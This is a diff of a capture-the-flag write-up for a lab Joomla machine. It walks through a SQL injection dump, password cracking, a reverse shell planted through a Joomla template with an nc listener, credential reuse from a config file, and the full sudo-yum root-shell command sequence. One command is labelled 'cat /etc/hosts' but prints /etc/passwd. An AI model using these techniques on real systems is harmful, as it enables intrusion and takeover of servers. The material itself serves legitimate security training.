@@ -486,7 +486,7 @@ I ran a search for `joomla version scanner` and got some good results. There was
 
 *What is the Joomla version?* [REDACTED]
 
-The task asks to use a Python tool rather than SQLMap. I ran a search for one. It took a few variations, but a search for `joomla 3.7.0 exploit` got me to a GitHub repository for Joomblah.py. It looks like it should be able to scrape the user data from the database. Running the script gets us Jonah's information, including a hash of his password. 
+The task asks to use a Python tool rather than SQLMap. I ran a search for one. It took a few variations, but a search for `joomla [VERSION REDACTED] exploit` got me to a GitHub repository for Joomblah.py. It looks like it should be able to scrape the user data from the database. Running the script gets us Jonah's information, including a hash of his password. 
 ```bash
 ──(bradley㉿kali)-[~]
 └─$ python3 joomblah.py http://10.10.38.147/                                                              1 ⨯
@@ -501,7 +501,7 @@ The task asks to use a Python tool rather than SQLMap. I ran a search for one. I
     |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
     |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
     |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
- __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
+ __.'   '                                              |/\'..' / '---'/ /   | |_| |     | |   
 |      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
 |____.'                                                                `--'  `" '---'   '---' 
 
@@ -519,11 +519,144 @@ Running that thru `hashcat` produces the plaintext password.
 
 Now we have login credentials, let's login, take a peek at the user interface, and look for some flags. 
 
-*What is the user flag?*
+### Login Attempts 
 
-*What is the root flag?* 
+**Homepage**
+We are able to use Jonah's credentials on the login form on the home page. That doesn't seem to lead anywhere. We can edit the article, but I don't see much else from my initial review. 
+
+**SSH**
+Trying to use Jonah's credentials to login via ssh didn't work. 
+
+**Joomla Administrator Page**
+We are able to log into the Joomla CMS using Jonah's credentials. Let's look around for the user flag. 
+
+### Reverse Shell Capture
+I can now create a complete page rather than edit one. Let's see about getting one to call my attacking machine using Pentest Monkey's reverse shell script. Trying to create a new article didn't work. The article wouldn't render the `php` code. It just printed as text on the website. 
+
+What I need to do is create an actual page and not an article. As I'm not too familiar with Joomla I looked up some of the documentation and found that I needed to start with a template and create the page that way. From the menu bar select `Extensions > Templates > Templates`. That displays a list of 2 choices: Beez3 or Protostar. I picked the one on top, Beez3, and clicked on the link. Rather than edit an existing file, I selected `New File`. Copying the raw `php-reverse-shell.php` file and pasting it into the new page. I updated the IP and port as needed and saved the new webpage as `shell.php`. 
+
+Back in my attack machine terminal, I started a `netcat` listener on the same port as in the script. 
+I pointed my web browser to `http://<machine IP>/shell.php`. I got a 404 not found error. 
+A little trial and error and I figured out that my new page was created in the `templates` directory. Pointing my browser to `http://<machine IP>/templates/shell.php` executed the reverse shell code and I caught a shell in my attacking machine terminal. 
+```bash
+root@kali:~# nc -lvnp 4321
+listening on [any] 4321 ...
+connect to [10.10.15.86] from (UNKNOWN) [10.10.135.152] 58242
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 22:53:07 up  2:40,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+apache
+sh-4.2$
+```
+
+Now let's see about getting the user flag. Looking around I couldn't access Jonah's home directory. Moving into the web directory, `/var/www/html` I looked at the configuration file `configuration.php`. It had some credentials listed as root's and password listed as `$secret`. 
+
+I tried to use both of those to `ssh` into the server, but neither worked. I tried using the `jonah` user with both passwords, but neither worked. I need to do more looking around. I checked the `/etc/passwd` file looking for more information on the system and possible users. 
+
+```bash
+sh-4.2$ cat /etc/hosts
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+```
+
+That gives me the username for Jonah as `jjameson`, not `jonah`. Trying that username with both of the passwords from the `configuration.php` file. That got me an ssh session as `jjameson`.
+
+Now I can access the user flag. 
+*What is the user flag?* 27[REDACTED]2e
 
 
-### SQLMap/SQLi Scan??
+### Privilege Escalation 
+Now I need to escalate my privileges to get the root flag. So let's see what `sudo` rights I have, if any, at this user level. 
+```bash
+[jjameson@dailybugle ~]$ sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
+    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
+    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
+    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
+    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+```
+
+I've got `sudo` access to `yum` with no password required. Let's see if there is anything else in the directory listing for it. 
+```bash
+[jjameson@dailybugle ~]$ ls -l /usr/bin/yum
+-rwxr-xr-x. 1 root root 801 Aug  8  2019 /usr/bin/yum
+```
+
+Everyone can run it, but no sticky bit to exploit. I looked for a privlege escalation exploit for `yum` and found something in the `GTFOBins` Git repository that showed spawning a root shell. It is a series of commands that creates a custom plugin that spawns the shell. I will give that a try. 
+
+```bash
+[jjameson@dailybugle ~]$ TF=$(mktemp -d)
+[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
+> [main]
+> plugins=1
+> pluginpath=$TF
+> pluginconfpath=$TF
+> EOF
+[jjameson@dailybugle ~]$ 
+[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
+> [main]
+> enabled=1
+> EOF
+[jjameson@dailybugle ~]$ 
+[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
+> import os
+> import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>   os.execl('/bin/sh','/bin/sh')
+> EOF
+[jjameson@dailybugle ~]$ 
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# whoami
+root
+sh-4.2# pwd
+/home/jjameson
+sh-4.2# cd /root
+sh-4.2# ls
+anaconda-ks.cfg  root.txt
+sh-4.2# cat root.txt
+ee[REDACTED]79
+sh-4.2# 
+```
+It worked like a charm. Now the root flag is accessible. 
+
+*What is the root flag?* ee[REDACTED]79
 
 ## Task 3 
+Giving credit where credit is due, the author notes the owner of the artwork used in the room. 
+
+
+## Summary
+It was a fun challenge. It had several layers of things to overcome, and I enjoyed it. 
